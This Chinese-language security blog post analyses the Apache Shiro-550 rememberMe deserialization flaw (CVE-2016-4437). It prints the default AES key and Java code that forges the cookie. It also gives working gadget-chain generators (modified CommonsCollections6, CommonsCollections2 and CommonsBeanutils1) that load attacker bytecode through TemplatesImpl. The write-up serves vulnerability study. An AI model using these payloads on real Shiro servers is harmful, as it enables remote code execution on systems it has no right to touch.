---
title: "Shiro-550 反序列化分析"
date: 2022-12-18T22:32:24+08:00
lastmod: 2022-12-18T22:32:24+08:00
draft: false
author: "X1r0z"

tags: ['shiro', 'cc', 'cb']
categories: ['Java安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

Shiro-550 反序列化原理分析, 以及无数组 CommonsCollections 链和 CommonsBeanutils 利用链的构造

<!--more-->

## Shiro 反序列化原理分析

shiro-550 又叫 CVE-2016-4437, 是针对 cookie 中 rememberMe 参数的反序列化漏洞, 影响版本为 `shiro 1.x < 1.2.5`

简单来说就是 shiro 会将 rememberMe 的值先 base64 解密, 然后 AES 解密, 最后反序列化, 而 1.2.5 之前的版本存在一个默认的 CipherKey, 导致攻击者可以利用这个默认 key 来注入反序列化 payload

1.2.5 版本之后官方采用了随机生成的 CipherKey, 但并不代表之后的版本就没有反序列化, 其实只要 key 能够被爆破出来就还是会存在这个漏洞

分析之前建议先看一遍下面的文章了解一下 shiro 框架的基本原理

[https://www.w3cschool.cn/shiro/](https://www.w3cschool.cn/shiro/)

[https://su18.org/post/shiro-1/](https://su18.org/post/shiro-1/)

环境我用的是 p 牛的 shirodemo

[https://github.com/phith0n/JavaThings/tree/master/shirodemo](https://github.com/phith0n/JavaThings/tree/master/shirodemo)

web.xml 如下

```xml
<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
         version="2.5">

  <listener>
    <listener-class>org.apache.shiro.web.env.EnvironmentLoaderListener</listener-class>
  </listener>

  <filter>
    <filter-name>ShiroFilter</filter-name>
    <filter-class>org.apache.shiro.web.servlet.ShiroFilter</filter-class>
  </filter>

  <filter-mapping>
    <filter-name>ShiroFilter</filter-name>
    <url-pattern>/*</url-pattern>
  </filter-mapping>

  <welcome-file-list>
    <welcome-file>index.jsp</welcome-file>
  </welcome-file-list>
</web-app>
```

在 Servlet 中 shiro 通过注入自定义的 web filter 来实现其功能, 所以我们只要跟着 ShiroFilter 这个类一步一步调试即可

在 Spring 中 shiro 通过注册 Bean 来实现, 因为后面的关键逻辑都一样就不写了

然后 ShiroFilter 继承自 AbstractShiroFilter, 后者存在 doFilterInternal 方法, 在这里打断点

在 burp 里面随便发一个带 rememberMe cookie 的请求包开始调试

![image-20221218210117505](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182101646.png)

进入到 doFilterInternal 方法

![image-20221218210147722](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182101892.png)

在 shiro 中每一个主体都被称为 Subject, 而这里的 web request 同样对应一个 Subject

之后会 Subject 会与 SecurityManager 交互来完成认证与授权

![image-20221218210346653](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182103830.png)

Builder 部分就是创建 subjectContext, 设置 SecurityManager 为 DefaultWebSecurityManager 然后将 servletRequest 和 servletResponse 放进去

跟进 buildWebSubject 方法

![image-20221218210603370](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182106445.png)

![image-20221218210642208](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182106386.png)

跟进 resolvePrincipals 方法

![image-20221218210940125](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182109301.png)

上下文中不存在用户信息 (也就是没有登录), 所以会转到 getRememberedIdentity 方法

![image-20221218211149076](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182111246.png)

继续跟进 CookieRememberMeManager 的 getRememberedPrincipals 方法

![image-20221218211245142](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182112333.png)

跟进 getRememberedSerializedIdentity 方法

![image-20221218211326462](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182113652.png)

从 cookie 的 rememberMe 参数中拿到 base64 数据并解码

然后会转到 convertBytesToPrincipals 方法

![image-20221218211423843](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182114030.png)

先 decrypt

![image-20221218211508492](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182115594.png)

虽然是 AES 加密, 但是默认的 CipherKey 往上翻就能看到

![image-20221218211545247](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182115344.png)

在构造方法里会将 CipherKey 设置成 EncryptionCipherKey 和 DecryptionCipherKey 分别用于加解密 (对于对称加密都一样)

然后 deserialize (这里调试的时候换了一次能够成功解密的 payload)

![image-20221218211720491](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182117541.png)

![image-20221218211956962](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182119149.png)

最后来到 readObject, 进行反序列化 (注意 ClassResolvingObjectInputStream 为 shiro 框架实现的自定义类, 会导致**非 Java 原生的数组反序列化失败**)

构造 rememberMe cookie 的 payload 如下, 其中 serialized 部分为序列化的 payload

```java
package com.example;

import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.util.ByteSource;

import java.io.*;

public class ShiroTest {
    public static void main(String[] args) throws Exception{

        byte[] serialized = new byte[]{...};
        CipherService cipherService = new AesCipherService();
        byte[] key = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource byteSource = cipherService.encrypt(serialized, key);
        byte[] value = byteSource.getBytes();
        String base64 = Base64.encodeToString(value);
        System.out.println(base64);
    }

    public static byte[] serialize(Object obj) throws Exception{
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bao);
        oos.writeObject(obj);
        return bao.toByteArray();
    }
}
```

到这里 shiro 本身的漏洞其实已经结束了, 后续需要结合 cc 链, cb 链或是其它第三方库利用链才能让这个反序列化发挥出实际效果

## CommonsCollections 无数组利用链

上面说过 shiro 使用了自己实现的 ClassResolvingObjectInputStream 来进行反序列化, 从而使得**非 Java 原生的数组会反序列化失败**

这就导致只要 cc 链包含了 Transformer 数组, 都会利用失败

参考文章 (写的很详细): [https://blog.zsxsoft.com/post/35](https://blog.zsxsoft.com/post/35)

解决办法有两种

1. 结合 RMI 协议来二次反序列化 (利用 JRMPClient)
2. 构造无数组形式的反序列化链

RMI 之前详细写过, 所以下面重点讲第二种方法

### CommonsCollections6 改造

cc6 的入口点是 TiedMapEntry 的 hashCode 方法, 从而触发 LazyMap

但因为需要通过反射调用 `Runtime.exec()`, 所以不可避免地要用到多个 InvokerTransformer

不过我们先回顾一下 LazyMap, 它的 get 方法会将传入的参数放到 transform 里面

![image-20221218214735527](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182147563.png)

再来看 TiedMapEntry, 其 getValue 方法会将 `this.key` 传入 `this.map.get()`

![image-20221218214646127](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182146209.png)

不难发现通过 TiedMapEntry 的 key 可以节省一步 ConstantTransformer 的操作, 而刚好 TemplatesImpl 链的触发只需要进行一次 newTransformer() 调用

所以将 LazyMap 的 factory 设置成单独的 InvokerTransformer, 然后利用 TiedMapEntry 传入 TemplatesImpl, 就可以避免 Transformer 数组的构造

改造的 payload 如下

```java
package com.example.CommonsCollections;

import com.example.Reflection;
import com.example.Serialization;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections6Shiro {
    public static void main(String[] args) throws Exception{

        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Evil.class.getName());
        byte[] code = clazz.toBytecode();

        Reflection.setFieldValue(templatesImpl, "_name", "Hello");
        Reflection.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{code});
        Reflection.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("toString", null, null);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry tme = new TiedMapEntry(outerMap, templatesImpl);

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        innerMap.clear();

        Reflection.setFieldValue(transformer, "iMethodName", "newTransformer");
        Serialization.test(expMap);
    }
}
```

![image-20221218220327977](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182203186.png)

后来发现 cc5 改一下也能够利用成功, 只是将入口点换成了 BadAttributeValueExpException, 其它部分完全相同, 就不单独写了

### CommonsCollections2 改造

cc2 是 commons-collections 4.0 中的利用链, 改造的思路差不多

TransformingComparator 会将被比较的对象传入 transform 方法

![image-20221218220601632](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182206679.png)

类似的, 往 PriorityQueue 中放入 TemplatesImpl 即可

```java
package com.example.CommonsCollections;

import com.example.Reflection;
import com.example.Serialization;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsCollections2Shiro {
    public static void main(String[] args) throws Exception{

        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Evil.class.getName());
        byte[] code = clazz.toBytecode();

        Reflection.setFieldValue(templatesImpl, "_name", "Hello");
        Reflection.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{code});
        Reflection.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("toString", null, null);

        Comparator comparator = new TransformingComparator(transformer);

        PriorityQueue priorityQueue = new PriorityQueue(2, comparator);
        priorityQueue.add(templatesImpl);
        priorityQueue.add(templatesImpl);

        Reflection.setFieldValue(transformer, "iMethodName", "newTransformer");
        Serialization.test(priorityQueue);
    }
}
```

## CommonsBeanutils1 利用链

上面 cc 链利用的前提是得存在 commons-collections, 但实际场景中目标可能只有 shiro 相关的依赖

因为 shiro 自带 commons-beanutils, 所以就有了 CommonsBeanutils1 利用链, 它解决了无 commons-collections 情况下 shiro 反序列化的利用

漏洞起源于 PropertyUtils, 其 getProperty 方法能够调用任意类的 getter

```java
PropertyUtils.getProperty(person, "name"); // person.getName();
```

`org.apache.commons.beanutils.BeanComparator` 的 compare 方法会通过 getProperty 分别调用两个对象的 getter

![image-20221218222058565](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182220665.png)

结合 PriorityQueue 能够传入自定义 Comparator 的特性, 构造 payload 如下

```java
package com.example;

import com.example.CommonsCollections.Evil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;

public class CommonsBeanutils1 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Evil.class.getName());
        byte[] code = clazz.toBytecode();

        Reflection.setFieldValue(templatesImpl, "_name", "Hello");
        Reflection.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{code});
        Reflection.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        BeanComparator beanComparator = new BeanComparator();
        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);
        priorityQueue.add(1);
        priorityQueue.add(1);

        beanComparator.setProperty("outputProperties");
        Reflection.setFieldValue(priorityQueue, "queue", new Object[]{templatesImpl, templatesImpl});
        Serialization.test(priorityQueue);
    }
}
```

然后不出意外的话你会在 tomcat 控制台里面得到一个 Exception (

就不截图了, 原因是 BeanComparator 的 `this.comparator` 默认来自 `org.apache.commons.collections.comparators.ComparableComparator`, 但这个类在 commons-beanutils 中又不存在 (很神奇)

所以我们需要自己找一个类似的 Comparator, 并且得保证它有如下特点

1. 来自原生 JDK 或 shiro 默认依赖包
2. 能够被序列化, 即继承了 Serializable 接口

利用 IDEA 可以找到五个符合条件的类

![image-20221218222922695](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182229802.png)

但实际上能用的就只有两个, 分别为 CaseInsensitiveComparator 和 ReverseComparator

![image-20221218223117173](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182231219.png)

![image-20221218223237699](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182232773.png)

最终构造 payload 如下

```java
package com.example;

import com.example.CommonsCollections.Evil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;

public class CommonsBeanutils1NoCC {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Evil.class.getName());
        byte[] code = clazz.toBytecode();

        Reflection.setFieldValue(templatesImpl, "_name", "Hello");
        Reflection.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{code});
        Reflection.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

//        BeanComparator beanComparator = new BeanComparator(null, Collections.reverseOrder());
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("1");

        beanComparator.setProperty("outputProperties");
        Reflection.setFieldValue(priorityQueue, "queue", new Object[]{templatesImpl, templatesImpl});
        Serialization.test(priorityQueue);
//        System.out.println(Arrays.toString(Serialization.serialize(priorityQueue)));
    }
}
```

![image-20221218223542053](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212182235282.png)